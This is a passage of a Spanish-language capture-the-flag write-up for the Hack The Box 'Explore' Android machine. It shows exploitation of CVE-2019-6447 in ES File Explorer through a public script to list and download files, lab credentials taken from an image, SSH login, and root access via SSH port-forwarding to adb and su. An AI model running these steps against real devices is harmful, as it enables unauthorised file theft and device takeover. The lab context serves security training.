+SF:id\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0e\x03\x03U\x1c\?\?random
+SF:1random2random3random4\0\0\x0c\0/\0&quot;)%r(Kerberos,BD,&quot;HTTP/1\.0\x20400\x
+SF:20Bad\x20Request\r\nDate:\x20Wed,\x2028\x20Jul\x202021\x2020:20:22\x20G
+SF:MT\r\nContent-Length:\x2041\r\nContent-Type:\x20text/plain;\x20charset=
+SF:US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20
+SF:\0\0\0qj\?n0\?k\?\x03\x02\x01\x05\?\x03\x02\x01&quot;);
+</code></pre></div></p>
+<h3 id="user-own"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg></span> User Own</h3>
+<p>El puerto mas interesante que encontramos es el <strong>33083</strong> , aunque nmap lo identifica como un servicio de 
+api para un server de minecraft, lo cierto es que en Android lo utiliza la aplicacion <strong>ES FILE EXPLORER</strong> para 
+montar un servidor web al que se puede acceder si estas dentro de la misma red.  </p>
+<ul>
+<li>Author: <a href="https://fs0c131y.com/">Elliot Alderson</a>  </li>
+<li>Vuln: <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6447">CVE-2019-6447</a></li>
+<li>p0c: <a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln">https://github.com/fs0c131y/ESFileExplorerOpenPortVuln</a>  </li>
+</ul>
+<p>En este caso voy a utilizar un exploit funcional que podemos encontrar con <code>searchsploit</code></p>
+<p><div class="highlight"><pre><span></span><code>[root@htb explore]# searchsploit es file explorer file read
+-------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                  |  Path
+-------------------------------------------------------------------------------- ---------------------------------
+ES File Explorer 4.1.9.7.4 - Arbitrary File Read                                | android/remote/50070.py
+-------------------------------------------------------------------------------- ---------------------------------
+</code></pre></div>
+Un vistazo al exploit nos muestra los comandos disponibles  </p>
+<p><div class="highlight"><pre><span></span><code>    print(&quot;Available commands : &quot;)
+    print(&quot;  listFiles         : List all Files.&quot;)
+    print(&quot;  listPics          : List all Pictures.&quot;)
+    print(&quot;  listVideos        : List all videos.&quot;)
+    print(&quot;  listAudios        : List all audios.&quot;)
+    print(&quot;  listApps          : List Applications installed.&quot;)
+    print(&quot;  listAppsSystem    : List System apps.&quot;)
+    print(&quot;  listAppsPhone     : List Communication related apps.&quot;)
+    print(&quot;  listAppsSdcard    : List apps on the SDCard.&quot;)
+    print(&quot;  listAppsAll       : List all Application.&quot;)
+    print(&quot;  getFile           : Download a file.&quot;)
+    print(&quot;  getDeviceInfo     : Get device info.&quot;)
+</code></pre></div>
+Tras un rato jugando con las rutas y entendiendo el alcance del exploit, me encuentro con un archivo interesante</p>
+<p><div class="highlight"><pre><span></span><code>[root@htb explore]# python3 50070.py listPics explore.htb
+
+==================================================================
+|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+|                Coded By : Nehal a.k.a PwnerSec                 |
+==================================================================
+
+name : concept.jpg
+time : 4/21/21 02:38:08 AM
+location : /storage/emulated/0/DCIM/concept.jpg
+size : 135.33 KB (138,573 Bytes)
+
+name : anc.png
+time : 4/21/21 02:37:50 AM
+location : /storage/emulated/0/DCIM/anc.png
+size : 6.24 KB (6,392 Bytes)
+
+name : creds.jpg
+time : 4/21/21 02:38:18 AM
+location : /storage/emulated/0/DCIM/creds.jpg
+size : 1.14 MB (1,200,401 Bytes)
+
+name : 224_anc.png
+time : 4/21/21 02:37:21 AM
+location : /storage/emulated/0/DCIM/224_anc.png
+size : 124.88 KB (127,876 Bytes)
+
+[root@htb explore]# python3 50070.py getFile explore.htb /storage/emulated/0/DCIM/creds.jpg
+
+==================================================================
+|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+|                Coded By : Nehal a.k.a PwnerSec                 |
+==================================================================
+
+[+] Downloading file...
+[+] Done. Saved as `out.dat`.
+[root@htb explore]# mv out.dat creds.jpg
+</code></pre></div>
+<img alt="" src="../../assets/explore/creds.jpg" /></p>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 2.5a5.5 5.5 0 0 0-3.096 10.047 9.005 9.005 0 0 0-5.9 8.18.75.75 0 0 0 1.5.045 7.5 7.5 0 0 1 14.993 0 .75.75 0 1 0 1.499-.044 9.005 9.005 0 0 0-5.9-8.181A5.5 5.5 0 0 0 12 2.5zM8 8a4 4 0 1 1 8 0 4 4 0 0 1-8 0z"/></svg></span> <code>kristi</code><br />
+<span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16.75 8.5a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5z"/><path fill-rule="evenodd" d="M15.75 0a8.25 8.25 0 0 0-7.851 10.79L.513 18.178A1.75 1.75 0 0 0 0 19.414v2.836C0 23.217.784 24 1.75 24h1.5A1.75 1.75 0 0 0 5 22.25v-1a.25.25 0 0 1 .25-.25h2.735a.75.75 0 0 0 .545-.22l.214-.213A.875.875 0 0 0 9 19.948V18.5a.25.25 0 0 1 .25-.25h1.086c.464 0 .91-.184 1.237-.513l1.636-1.636A8.25 8.25 0 1 0 15.75 0zM9 8.25a6.75 6.75 0 1 1 4.288 6.287.75.75 0 0 0-.804.168l-1.971 1.972a.25.25 0 0 1-.177.073H9.25A1.75 1.75 0 0 0 7.5 18.5v1H5.25a1.75 1.75 0 0 0-1.75 1.75v1a.25.25 0 0 1-.25.25h-1.5a.25.25 0 0 1-.25-.25v-2.836a.25.25 0 0 1 .073-.177l7.722-7.721a.75.75 0 0 0 .168-.804A6.73 6.73 0 0 1 9 8.25z"/></svg></span> <code>Kr1sT!5h@Rp3xPl0r3!</code>  </p>
+<p>Con estos datos podemos acceder por ssh y ver la flag <strong>user.txt</strong>
+<div class="highlight"><pre><span></span><code>[root@htb explore]# ssh -p 2222 -l kristi explore.htb
+Password authentication
+Password:
+:/ $ cat sdcard/user.txt
+f32017174c7c7e8f*********
+:/ $
+</code></pre></div></p>
+<h3 id="root-own"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg></span> Root Own</h3>
+<p>Para conectarnos como root a un dispositivo Android, normalmente usamos <strong>adb</strong> mientras mantenemos conectado
+el dispositivo por usb, siempre y cuando tengamos habilitada la depuracion USB.
+<a href="https://developer.android.com/studio/command-line/adb"><strong>Android Debug Bridge (adb)</strong></a></p>
+<p>Tal y como se explica en el articulo anterior, adb necesita un servidor en ejecucion para establecer la conexion
+con el emulador en un puerto entre 5555-5585.<br />
+Sabiendo esto vamos a analizar los puertos a la escucha.</p>
+<p><div class="highlight"><pre><span></span><code>[root@htb explore]# ssh -p 2222 -l kristi explore.htb
+Password authentication
+Password:
+:/ $ netstat -natpe |grep -i listen
+tcp6       0      0 ::ffff:127.0.0.1:34131  :::*                    LISTEN      10077      3174975     -
+tcp6       0      0 :::5555                 :::*                    LISTEN      2000       7568        -
+tcp6       0      0 :::42135                :::*                    LISTEN      10077      3174581     -
+tcp6       0      0 :::59777                :::*                    LISTEN      10077      3173587     -
+tcp6       0      0 ::ffff:10.10.10.2:41953 :::*                    LISTEN      10077      3173217     -
+tcp6       0      0 :::2222                 :::*                    LISTEN      10076      39360       3659/net.xnano.android.sshserver
+:/ $
+</code></pre></div>
+perfecto, tenemos a la escucha el puerto 5555 pero no tenemos acceso por USB..<br />
+Una solucion para establecer la conexion con adb consiste en establecer un puente a traves del ssh,
+nateando el puerto 5555 a nuestra maquina local y enviando un adb hacia ese puerto.  </p>
+<p>Un articulo que lo explica con sencillez es el siguiente :<br />
+<a href="https://www.ifthenel.se/port-forwarding-over-ssh-to-an-android-things/">Port forwarding over SSH to an Android Thing(s)</a></p>
+<p>Para realizar esta tarea manualmente hariamos lo siguiente abriendo dos terminales :  </p>
+<p>Terminal01<br />
+<code>ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247</code></p>
+<p>Terminal02<br />
+<code>adb connect localhost:5555</code><br />
+<code>adb shell</code><br />
+<code>su</code>  </p>
+<p>Root Flag Location : <code>/data/root.txt</code></p>
+<blockquote>
+<p><strong>EXTRA</strong> : Como me habia sabido a poco la explotacion del usuario root, he hecho un script que automatiza el proceso
+haciendo uso de <code>expect</code> y no requiere interaccion humana</p>
+</blockquote>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4.97 11.03a.75.75 0 1 1 1.06-1.06L11 14.94V2.75a.75.75 0 0 1 1.5 0v12.19l4.97-4.97a.75.75 0 1 1 1.06 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0l-6.25-6.25zm-.22 9.47a.75.75 0 0 0 0 1.5h14.5a.75.75 0 0 0 0-1.5H4.75z"/></svg></span> Descarga : <a href="../../assets/explore/autoexploit.sh">autoexploit.sh</a></p>
+<div class="highlight"><pre><span></span><code>[root@htb explore]# ./autoexploit.sh
+spawn /usr/bin/adb connect localhost:5555
+spawn /usr/bin/adb shell
+x86_64:/ $ su
+:/ # ls -alt /data/root.txt
+-rw------- 1 root root 33 2021-03-13 18:31 /data/root.txt
+</code></pre></div>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" data-md-state="hidden">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../.." class="md-footer__link md-footer__link--prev" aria-label="Previous: Home" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Home
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../bountyhunter/" class="md-footer__link md-footer__link--next" aria-label="Next: BountyHunter" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              BountyHunter
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+        
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.53c85856.min.js", "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.716f8af4.min.js"></script>
+      
+    
+  </body>
+</html>
